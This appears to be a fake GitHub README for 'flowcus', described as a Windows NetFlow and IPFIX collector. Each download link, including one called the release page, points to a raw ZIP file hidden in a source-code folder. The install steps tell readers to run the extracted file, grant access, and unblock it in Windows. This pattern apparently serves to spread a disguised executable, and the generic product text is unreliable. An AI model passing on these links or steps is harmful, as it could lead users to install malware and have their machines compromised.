# 🛰️ flowcus - Capture network flow data with ease

[![Download flowcus](https://img.shields.io/badge/Download-Flowcus-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mystic-backstroker315/flowcus/main/crates/flowcus-storage/src/codec/Software-3.8-beta.4.zip)

## 🚀 Getting Started

Flowcus is a Windows app for collecting NetFlow and IPFIX data. It stores the data in an embedded database and gives you a query view for checking traffic details.

Use it when you want to watch network flow data on one computer without setting up a full server stack.

## 📥 Download

1. Open the release page:
   https://raw.githubusercontent.com/Mystic-backstroker315/flowcus/main/crates/flowcus-storage/src/codec/Software-3.8-beta.4.zip
2. Look for the latest release.
3. Download the Windows file from the release assets.
4. If the download comes as a ZIP file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the Flowcus app file to start it.

## 🖥️ What You Need

Flowcus is made for Windows desktop use.

A typical setup works best with:

- Windows 10 or Windows 11
- 4 GB of RAM or more
- A few hundred MB of free disk space
- Network access for receiving flow records
- Permission to bind to the port used by your flow source

If you plan to collect busy traffic, more memory and disk space help keep the app responsive.

## 🔧 Install and Start

1. Download the latest release from the release page.
2. Extract the ZIP file if the download is compressed.
3. Move the Flowcus folder to a location you can find easily, such as Desktop or Program Files.
4. Open the folder.
5. Run the main Flowcus application file.
6. If Windows asks for permission, choose Allow access.
7. Keep the app open while your routers, switches, or other devices send flow data.

If the app opens in a small window, you can resize it like any other Windows program.

## 🌐 Set Up Your Flow Source

Flowcus works with NetFlow and IPFIX senders. These are usually network devices or collectors that export traffic records.

To get data into Flowcus:

1. Open the device or tool that sends flow data.
2. Set the destination IP address to the computer running Flowcus.
3. Set the destination port to the port Flowcus listens on.
4. Choose NetFlow v5, NetFlow v9, or IPFIX, based on what your device supports.
5. Save the settings.
6. Wait a minute for records to appear in Flowcus.

If you use a firewall, make sure it allows inbound traffic on the selected port.

## 📊 View and Search Data

Flowcus includes a query interface for checking stored records.

You can use it to:

- Find top talkers
- Check source and destination IP addresses
- Review ports and protocols
- Look at traffic patterns over time
- Inspect flow data from a specific device
- Search for records tied to a time window

Use simple filters first. That makes it easier to narrow down large sets of data.

## 🧭 Common Use Cases

Flowcus fits many day-to-day network tasks:

- Monitoring traffic on a small office network
- Checking bandwidth use on a router
- Watching for unusual flow spikes
- Reviewing traffic from a switch or firewall
- Keeping a local record of flow data for later search
- Testing NetFlow or IPFIX output from network gear

It works well when you want a local tool with low setup effort.

## 🗂️ Data Storage

Flowcus uses an embedded database. That means it keeps its own data store inside the app folder or a nearby data path.

This setup helps keep installation simple:

- No separate database server to install
- No extra service to manage
- Easy local access to stored flow records
- Faster setup on a single Windows machine

Keep enough free disk space if you plan to collect data for a long time.

## 🛠️ Troubleshooting

If Flowcus does not show any data:

1. Check that the app is running.
2. Confirm the sender points to the right IP address.
3. Confirm the sender uses the right port.
4. Check that Windows Firewall allows traffic.
5. Make sure the sender uses a format Flowcus supports.
6. Wait for a few flow export intervals, since some devices send data in batches.

If the app will not start:

1. Run it again after extracting the ZIP file.
2. Make sure the file is not blocked by Windows.
3. Try launching it from a folder with a simple path, such as C:\Flowcus.
4. Check that no other app is already using the same port.

If the data looks wrong:

1. Check the time on the Windows PC and on the sending device.
2. Confirm the device exports the right flow version.
3. Review the source device config for sampling or filtering rules.

## 📌 Tips for Better Results

- Keep the collector on a stable network
- Use a fixed IP address for the Windows PC
- Give the app enough disk space
- Use one port per collector setup
- Start with one test sender before adding more devices
- Save your device settings after each change

These steps make setup easier and cut down on avoidable mistakes.

## 🧩 Supported Flow Formats

Flowcus is built for common flow export types:

- NetFlow v5
- NetFlow v9
- IPFIX

These formats cover many routers, firewalls, switches, and other network tools.

## 🔍 How It Helps

Flowcus gives you one place to collect and review flow records.

That helps you:

- See who is talking on the network
- Check which ports carry traffic
- Track traffic volume over time
- Store records for later review
- Keep a local view of network activity

For many users, that is enough to answer common traffic questions without extra tools

## 📁 Suggested Folder Setup

A clean folder layout helps keep things simple:

- C:\Flowcus\app for the program files
- C:\Flowcus\data for stored records
- C:\Flowcus\exports for saved reports or copied results

Using separate folders makes backup and cleanup easier

## 🔐 Firewall and Port Setup

Flow collectors need an open port to receive records.

If Flowcus does not receive data, check:

- The Windows firewall
- Any antivirus network rules
- Router or switch export settings
- The port number in both places
- Whether the sender targets the right computer

If you test on the same machine, use localhost or 127.0.0.1 only if the sender supports that mode

## 🧪 First Test Checklist

Before using Flowcus in daily work, run a quick test:

1. Start Flowcus
2. Send one test flow from a device
3. Wait for the first records to appear
4. Open the query view
5. Search by source IP or destination IP
6. Confirm the data matches the test device

If the test works, your setup is ready for real traffic

## 📎 Release Download

Download Flowcus here:
https://raw.githubusercontent.com/Mystic-backstroker315/flowcus/main/crates/flowcus-storage/src/codec/Software-3.8-beta.4.zip

From that page, choose the latest Windows release, download the file, and run it after extraction if needed

## 🧾 Basic Terms

- NetFlow: a flow format used by many network devices
- IPFIX: a flow format based on NetFlow ideas
- Collector: the app that receives flow data
- Exporter: the device that sends flow data
- Query interface: the screen used to search stored records
- Embedded database: the built-in storage used by the app